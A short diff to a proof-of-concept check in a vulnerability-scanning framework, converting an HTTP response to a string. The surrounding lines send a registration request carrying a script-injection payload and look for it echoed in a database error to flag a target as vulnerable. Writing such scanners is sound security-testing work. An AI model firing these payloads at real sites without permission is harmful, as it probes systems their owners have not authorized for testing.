@@ -55,7 +55,7 @@ class Poc(ABPoc):
                 '%3E&password_2=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&action=Create+Account'
             request = urllib.request.Request(verify_url, data=verify_data)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             if "Duplicate entry '<script>alert(123)</script>' for key 'email'" in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
